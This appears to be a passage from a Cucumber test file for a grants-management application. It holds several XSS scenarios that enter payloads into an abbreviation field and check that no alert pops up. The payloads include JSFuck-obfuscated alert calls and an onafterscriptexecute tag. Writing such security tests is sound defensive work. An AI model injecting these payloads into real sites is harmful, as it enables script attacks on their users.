      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |  ';parent[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301706 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |   ';frames[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//   | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @301708 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                                                                                           | Field                |
      |   ';globalThis[(+{}+[])[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]]((+{}+[])[+!![]]);//    | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |

  @300080 @Vrushali
  Scenario Outline: XSS- Data table- (Admin) To verify when user enters script in the text field then alert should not display
    Given I have "default" configuration as below:
      | configurationCategory                    | fieldName           | fieldOrignalValue  | filterId         |
      | Flex Grid:General                        | Display Field Names | <defaultFieldsApi> | ApiGeneratedId:0 |
      | Page Block Config:Page Block Rule Detail | Is Active           | false              | ApiGeneratedId:1 |
    Given I setup test configuration as below:
      | configurationCategory                    | fieldName           | fieldNewValue  | coreComponentField    | coreCOmponentSubFieldName | coreComponentSubFieldValue |
      | Flex Grid:General                        | Display Field Names | <newFieldsApi> | Programs              | Name                      |                            |
      | Page Block Config:Page Block Rule Detail | Is Active           | true           | Grantor State Program | PB-6613                   | PBD-17751                  |
    When I login as "<User>" user
    When I setup my app as "As a Grantor"
    And I navigate to "Planning" tab
    And I click toggle button to select "Internal Programs - Draft"
    And I click on "Edit" icon in flex table for first draft record
    When I enter values into fields
      | Value                                                      | Field                |
      |   <xss onafterscriptexecute=alert(1)><script>1</script>    | fieldAbbreviation__c |
    When I click on "Save" in the page details
    Then I do not see alert popup box
    Examples:
      | User  | newFieldsApi                                                                                                                             | defaultFieldsApi                                                                 |
      | ADMIN | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
      | PM    | Name,ProgramName__c,Abbreviation__c,TestRich__c,AssistanceType__c,BeneficiaryEligibility__c,Type__c,Account__c,Status__c,FundedAmount__c | Name,ProgramName__c,Type__c,Account__c,Status__c,FundedAmount__c,Abbreviation__c |
